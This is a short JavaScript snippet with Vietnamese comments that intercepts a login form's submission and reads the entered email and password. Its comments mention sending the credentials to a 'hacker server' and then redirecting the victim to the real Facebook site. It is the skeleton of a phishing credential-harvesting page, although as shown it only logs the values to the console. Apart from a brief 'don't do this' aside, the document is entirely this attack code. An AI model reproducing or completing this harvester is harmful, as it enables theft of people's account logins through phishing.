document.querySelector('.login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Ngăn chặn gửi form mặc định
    var email = document.querySelector('input[name="email"]').value;
    var password = document.querySelector('input[name="pass"]').value;
    // Gửi thông tin đăng nhập đến máy chủ hacker (không nên làm điều này!)
    console.log('Email:', email);
    console.log('Password:', password);
    // Sau đó, bạn có thể thực hiện bất kỳ hành động nào khác, như chuyển hướng người dùng đến trang Facebook thật.
});
